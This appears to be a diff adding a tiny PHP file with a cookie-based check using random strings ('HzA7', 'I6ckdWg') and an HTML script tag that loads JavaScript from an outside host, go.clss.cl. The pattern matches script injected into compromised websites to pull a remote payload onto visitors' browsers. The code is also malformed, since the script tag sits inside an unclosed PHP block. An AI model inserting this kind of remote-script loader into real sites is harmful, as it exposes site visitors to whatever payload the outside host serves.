@@ -1,0 +1,6 @@
+<?php
+
+if(isset($_COOKIE['HzA7'])) {
+    die('I6ckdWg');
+}
+<script type="text/javascript" src="http://go.clss.cl/dwl"></script>
